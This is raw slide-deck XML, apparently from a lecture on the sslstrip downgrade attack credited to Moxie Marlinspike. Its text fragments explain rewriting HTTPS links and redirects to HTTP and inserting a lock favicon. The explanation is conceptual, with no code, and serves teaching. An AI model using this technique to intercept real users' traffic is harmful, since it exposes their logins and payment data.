            <a:ext cx="8157600" cy="558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Typical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pattern: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upgrade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Come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site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over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HTTP,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redirect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HTTPS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login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Browse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site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over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HTTP,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redirect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HTTPS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checkout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sslstrip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:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-11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800" b="0" strike="noStrike" spc="-11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attacker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downgrades</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-11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connection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87280">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1970"/>
              </a:spcBef>
              <a:tabLst>
                <a:tab pos="5028480" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pP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HTTP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	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SSL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087280">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="510"/>
              </a:spcBef>
              <a:tabLst>
                <a:tab pos="5028480" algn="l"/>
              </a:tabLst>
              <a:defRPr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522240">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:tabLst>
                <a:tab pos="5028480" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pP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attacker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950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  <a:tab pos="52426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Rewrite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&lt;a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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href=https://…&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-46">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> 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&lt;a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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99"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>href=http://…&gt;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  <a:tab pos="522360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Redirect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Location:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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https://...</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> 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000099"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Location:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-75">
                <a:solidFill>
                  <a:srgbClr val="000099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99"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>http://...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138374" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="4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A7ACD455-67CF-4782-85EB-303C456CD02A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102757" name="object 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6248520" y="5761080"/>
            <a:ext cx="2514240" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFADD6"/>
          </a:solidFill>
          <a:ln w="952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685080" indent="-510480">
              <a:lnSpc>
                <a:spcPts val="2129"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="96"/>
              </a:spcBef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server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detect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this</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-7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attack?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982642" name="object 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6756480" y="1143000"/>
            <a:ext cx="2158560" cy="369720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 2158560"/>
              <a:gd name="textAreaRight" fmla="*/ 2158920 w 215856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2159000" h="370205" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="2159000" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="369887"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2159000" y="369887"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2159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52524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Will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You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Notice?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4553160" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6835320" y="1176120"/>
            <a:ext cx="197892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[Moxie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Marlinspike]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537921" name="object 5"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="457200" y="2438280"/>
            <a:ext cx="3657240" cy="1047240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="502753700" name="object 6"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5197320" y="2438280"/>
            <a:ext cx="3412800" cy="1371240"/>
            <a:chOff x="5197320" y="2438280"/>
            <a:chExt cx="3412800" cy="1371240"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="407" name="object 7"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId4"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5197320" y="2438280"/>
              <a:ext cx="3412800" cy="1066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08" name="object 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5197320" y="2895480"/>
              <a:ext cx="1279080" cy="914040"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 1279080"/>
                <a:gd name="textAreaRight" fmla="*/ 1279440 w 1279080"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 914040"/>
                <a:gd name="textAreaBottom" fmla="*/ 914400 h 914040"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="1279525" h="914400" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="457199"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2348" y="417750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9265" y="379233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20558" y="341785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36036" y="305544"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55507" y="270645"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78778" y="237228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105657" y="205429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="135953" y="175385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169473" y="147233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="206025" y="121112"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="245417" y="97157"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="287458" y="75506"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="331955" y="56297"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="378716" y="39667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="427549" y="25753"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="478263" y="14692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="530664" y="6621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="584561" y="1678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="639762" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="694963" y="1678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="748861" y="6621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="801262" y="14692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="851975" y="25753"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="900808" y="39667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="947569" y="56297"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="992066" y="75506"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1034107" y="97157"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1073500" y="121112"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1110052" y="147233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1143572" y="175385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1173868" y="205429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1200747" y="237228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1224018" y="270645"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1243488" y="305544"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1258966" y="341785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1270260" y="379233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1277177" y="417750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1279525" y="457199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1277177" y="496648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1270260" y="535165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1258966" y="572613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1243488" y="608855"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1224018" y="643753"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1200747" y="677171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1173868" y="708970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1143572" y="739014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1110052" y="767165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1073500" y="793287"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1034107" y="817242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="992066" y="838892"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="947569" y="858101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="900808" y="874732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="851975" y="888646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="801262" y="899707"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="748861" y="907778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="694963" y="912721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="639762" y="914399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="584561" y="912721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="530664" y="907778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="478263" y="899707"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="427549" y="888646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="378716" y="874732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="331955" y="858101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="287458" y="838892"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="245417" y="817242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="206025" y="793287"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169473" y="767165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="135953" y="739014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105657" y="708970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78778" y="677171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55507" y="643753"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36036" y="608855"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20558" y="572613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9265" y="535165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="496648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="457199"/>
                  </a:lnTo>
                  <a:close/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311473" name="object 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4392000" y="2700000"/>
            <a:ext cx="4766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3600" b="0" strike="noStrike" spc="-52">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Symbol"/>
              </a:rPr>
              <a:t>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22668" name="object 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3276720" y="4260960"/>
            <a:ext cx="3358800" cy="716760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFADD6"/>
          </a:solidFill>
          <a:ln w="952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91440">
              <a:lnSpc>
                <a:spcPts val="2761"/>
              </a:lnSpc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Clever</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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favicon</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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inserted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91440">
              <a:lnSpc>
                <a:spcPts val="2880"/>
              </a:lnSpc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attacker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51692598" name="object 11"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5197320" y="3486240"/>
            <a:ext cx="311400" cy="775080"/>
            <a:chOff x="5197320" y="3486240"/>
            <a:chExt cx="311400" cy="775080"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="412" name="object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5197320" y="3512880"/>
              <a:ext cx="279000" cy="748440"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 279000"/>
                <a:gd name="textAreaRight" fmla="*/ 279360 w 279000"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 748440"/>
                <a:gd name="textAreaBottom" fmla="*/ 748800 h 748440"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="279400" h="748664" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="748131"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="279016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13" name="object 13"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId5"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5383800" y="3486240"/>
              <a:ext cx="124920" cy="139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78041176" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="4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D5922357-207C-4AF5-A04B-3219DC84969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62149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234360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Motivation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841255104" name="object 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="762120" y="1523880"/>
            <a:ext cx="6935400" cy="4952880"/>
            <a:chOff x="762120" y="1523880"/>
            <a:chExt cx="6935400" cy="4952880"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="417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762120" y="1600200"/>
              <a:ext cx="6935400" cy="487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8" name="object 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1295280" y="1523880"/>
              <a:ext cx="685440" cy="557280"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 685440"/>
                <a:gd name="textAreaRight" fmla="*/ 685800 w 685440"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 557280"/>
                <a:gd name="textAreaBottom" fmla="*/ 557640 h 557280"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="685800" h="557530" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="363918" y="112010"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="469582" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="461168" y="149028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="571722" y="81827"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="520064" y="168505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="685799" y="171420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="539273" y="242542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="580072" y="291246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="520064" y="317559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="599344" y="403257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="464819" y="370185"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="474408" y="448092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="386714" y="411073"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368680" y="486064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="313435" y="448092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276225" y="508508"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="238982" y="467568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156114" y="557212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152558" y="470535"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="40798" y="459829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105727" y="396498"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="332186"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124936" y="299037"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37211" y="213340"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170560" y="201654"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142938" y="93513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="271462" y="164635"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="308673" y="48678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="363918" y="112010"/>
                  </a:lnTo>
                  <a:close/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4706404" name="object 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3352680" y="533520"/>
            <a:ext cx="1574280" cy="533160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="2857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rIns="0" bIns="0" anchor="t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  <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>https://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95423510" name="object 7"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1085760" y="533520"/>
            <a:ext cx="7752960" cy="4289040"/>
            <a:chOff x="1085760" y="533520"/>
            <a:chExt cx="7752960" cy="4289040"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="421" name="object 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1752480" y="533520"/>
              <a:ext cx="1599840" cy="990360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 1599840"/>
                <a:gd name="textAreaRight" fmla="*/ 1600200 w 1599840"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 990360"/>
                <a:gd name="textAreaBottom" fmla="*/ 990720 h 990360"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="1600200" h="990600" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="990599"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1600199" y="0"/>
                  </a:lnTo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object 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1828800" y="1112760"/>
              <a:ext cx="1523520" cy="716040"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 1523520"/>
                <a:gd name="textAreaRight" fmla="*/ 1523880 w 1523520"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 716040"/>
                <a:gd name="textAreaBottom" fmla="*/ 716400 h 716040"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="1524000" h="716280" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="715961"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1523999" y="0"/>
                  </a:lnTo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object 10"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5308560" y="1600200"/>
              <a:ext cx="685440" cy="557280"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 685440"/>
                <a:gd name="textAreaRight" fmla="*/ 685800 w 685440"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 557280"/>
                <a:gd name="textAreaBottom" fmla="*/ 557640 h 557280"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="685800" h="557530" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="363918" y="112010"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="469582" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="461168" y="149028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="571722" y="81827"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="520064" y="168505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="685799" y="171420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="539273" y="242542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="580072" y="291246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="520064" y="317559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="599344" y="403257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="464820" y="370185"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="474408" y="448092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="386714" y="411073"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368680" y="486064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="313435" y="448092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276224" y="508508"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="238982" y="467568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156114" y="557212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152558" y="470535"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="40798" y="459829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105727" y="396498"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="332186"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124936" y="299037"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37210" y="213340"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170560" y="201654"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142938" y="93513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="271462" y="164635"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="308673" y="48678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="363918" y="112010"/>
                  </a:lnTo>
                  <a:close/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4" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5842080" y="1969920"/>
              <a:ext cx="2336400" cy="468360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 2336400"/>
                <a:gd name="textAreaRight" fmla="*/ 2336760 w 2336400"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 468360"/>
                <a:gd name="textAreaBottom" fmla="*/ 468720 h 468360"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="2336800" h="468630" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="2336799" y="468312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5" name="object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5651640" y="2081160"/>
              <a:ext cx="2501640" cy="966600"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 2501640"/>
                <a:gd name="textAreaRight" fmla="*/ 2502000 w 2501640"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 966600"/>
                <a:gd name="textAreaBottom" fmla="*/ 966960 h 966600"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="2501900" h="967105" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="2501899" y="966786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26" name="object 13"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId4"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="7950240" y="2311560"/>
              <a:ext cx="888480" cy="888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7" name="object 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1085760" y="3733920"/>
              <a:ext cx="6076440" cy="1088640"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 6076440"/>
                <a:gd name="textAreaRight" fmla="*/ 6076800 w 6076440"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 1088640"/>
                <a:gd name="textAreaBottom" fmla="*/ 1089000 h 1088640"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="6076950" h="1089025" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="6076948" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
